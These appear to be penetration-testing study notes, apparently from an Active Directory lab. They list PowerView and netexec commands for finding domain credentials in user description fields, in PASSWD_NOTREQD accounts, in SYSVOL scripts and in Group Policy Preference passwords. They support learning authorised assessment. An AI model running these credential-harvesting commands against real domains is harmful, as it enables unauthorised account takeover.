1. Password in Description Field
```powershell
 Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
2. PASSWD_NOTREQD Field
	- If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
3. Credentials in SMB Shares and SYSVOL Scripts
```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
4. GPP Passwords
```bash
netexec smb <DC-IP> -u john -p pass -M gpp_password
netexec smb <DC-IP> -u john -p pass -M gpp_autologin
```
